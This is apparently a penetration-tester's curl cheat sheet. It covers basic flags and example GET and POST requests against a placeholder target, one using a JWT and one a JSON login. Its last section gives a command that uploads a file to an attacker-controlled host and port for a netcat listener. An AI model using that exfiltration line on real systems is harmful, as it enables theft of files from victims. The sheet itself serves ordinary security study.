---
title: CURL
summary: A command line tool and library for transferring data with URL syntax.
description: A command line tool and library for transferring data with URL syntax.
---

**[https://github.com/curl/curl](https://github.com/curl/curl)**

## CURL Base


 > 
 > **<font color=red>curl</font> http://my.url**</br>
 > Get HTTP Content.

## CURL Flags


 > 
 > **<font color=red>-s</font>**</br>
 > Silent.
 > 
 > **<font color=red>-k</font>**</br>
 > Ignore HTTPS Errors.
 > 
 > **<font color=red>-i</font>**</br>
 > Show Response Headers.
 > 
 > **<font color=red>-u</font> admin<font color=red>:</font>admin**</br>
 > Provide Credentials.

 > 
 > **<font color=red>-X</font> POST**</br>
 > Specifies method.
 > 
 > **<font color=red>-d</font>**</br>
 > POST data.

 > 
 > **<font color=red>-H '</font>myHeader: myValue<font color=red>'</font>**</br>
 > Set Header.

## Example GET Request with JWT


 > 
 > **<font color=red>curl '</font>http://\[TARGET_IP\]/api/book/1<font color=red>'  \\</font>**</br>
 > **<font color=red>-H 'Authorization: Bearer</font> \[JWT_TOKEN\]<font color=red>'</font>**
 > Example GET request with JWT.

## CURL Example POST Request with JSON content


 > 
 > **<font color=red>curl '</font>http://\[TARGET_IP\]/api/auth/login<font color=red>' \\</font>**</br>
 > **<font color=red>-X POST \\</font>**</br>
 > **<font color=red>-H "Content-Type: application/json" \\</font>**</br>
 > **<font color=red>-d '{"</font>username<font color=red>":"</font>User<font color=red>","</font>password<font color=red>":"</font>P@ssw0rd<font color=red>"}'</font>**
 > Example POST request with JSON content.

## CURL Send File


 > 
 > **<font color=red>curl</font> \[ATTACKER_IP\]<font color=red>:</font>\[ATTACKER_PORT\]<font color=red> -F 'data=@</font>fmyFile<font color=red>'</font>**</br>
 > Send myFile to an netcat listener.
